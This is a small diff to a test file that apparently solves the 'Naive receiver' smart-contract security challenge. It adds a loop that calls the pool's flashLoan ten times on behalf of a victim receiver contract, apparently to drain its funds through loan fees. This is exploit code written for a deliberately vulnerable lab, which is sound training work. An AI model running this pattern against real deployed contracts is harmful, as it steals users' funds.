@@ -38,11 +38,12 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
-
+        const ETH = await pool.ETH();
+        
         for(let i =0; i<10; i++) {
         console.log("receiver address:", receiver.address);
-        console.log("eth address", pool.ETH)
-        await pool.connect(player).flashLoan(receiver.address, pool.ETH, 0, "0x");
+        console.log("eth address", ETH)
+        await pool.connect(player).flashLoan(receiver.address, ETH, 0, "0x");
         console.log("iteration", i)
         }
     });
